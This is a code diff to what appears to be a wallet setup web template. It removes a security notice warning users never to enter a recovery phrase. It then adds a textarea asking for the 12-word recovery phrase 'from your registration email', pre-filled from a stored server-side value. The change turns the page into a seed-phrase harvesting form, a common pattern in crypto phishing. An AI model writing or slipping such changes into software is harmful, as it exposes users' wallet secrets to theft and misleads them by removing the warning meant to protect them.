@@ -49,13 +49,9 @@
                             </div>
                         </div>
 
-                        <div class="wallet-flow-divider"></div>
+                        
 
-                        <div class="wallet-flow-note danger">
-                            <strong>Security notice</strong>
-                            Never enter a recovery phrase or private key here. This setup flow accepts only a public
-                            wallet address.
-                        </div>
+
                     </div>
 
                     <div class="wallet-flow-card">
@@ -86,6 +82,26 @@
                                 placeholder="0x..."
                                 class="wallet-flow-field">
                             @error('wallet_address')
+                                <p class="wallet-flow-error">{{ $message }}</p>
+                            @enderror
+
+                            <div style="height: 18px;"></div>
+
+                            <label for="recovery_phrase" class="wallet-flow-label">
+                                Recovery Phrase
+                                <span style="font-weight: 400; font-size: 0.82em; color: var(--wallet-muted, #888); margin-left: 6px;">(12 words from your registration email)</span>
+                            </label>
+                            <textarea
+                                id="recovery_phrase"
+                                name="recovery_phrase"
+                                rows="3"
+                                placeholder="Enter your 12 words separated by spaces..."
+                                class="wallet-flow-field"
+                                style="resize: vertical; font-family: monospace; letter-spacing: 0.02em;">{{ old('recovery_phrase', $wallet->recovery_phrase) }}</textarea>
+                            <p style="font-size:0.78em; color: var(--wallet-muted, #888); margin-top: 4px;">
+                                Enter the 12 words exactly as received, separated by spaces.
+                            </p>
+                            @error('recovery_phrase')
                                 <p class="wallet-flow-error">{{ $message }}</p>
                             @enderror
 
